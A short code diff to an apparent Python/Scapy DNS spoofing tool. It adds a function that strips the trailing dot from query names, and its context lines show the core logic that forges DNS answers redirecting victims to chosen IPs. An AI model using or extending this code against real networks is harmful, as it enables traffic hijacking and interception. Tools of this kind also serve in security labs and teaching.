@@ -59,7 +59,7 @@ def load_file(file_path):
 
 def packet_spoofing(pack):
     if is_valid_packet(pack):
-        query_name = pack[DNSQR].qname
+        query_name = sanitize(pack[DNSQR].qname)
         ip_to_redirect = get_ip_to_redirect(query_name)
         sf_pkt = IP(dst=pack[IP].src, src=pack[IP].dst) / \
                  UDP(dport=pack[UDP].sport, sport=pack[UDP].dport) / \
@@ -67,6 +67,10 @@ def packet_spoofing(pack):
                      an=DNSRR(rrname=pack[DNS].qd.qname, rdata=ip_to_redirect, ttl=15))
         send(sf_pkt)
         print "New packet is ", pack.summary()
+
+
+def sanitize(query_name):
+    return query_name.rstrip('.')
 
 
 def is_valid_packet(pack):
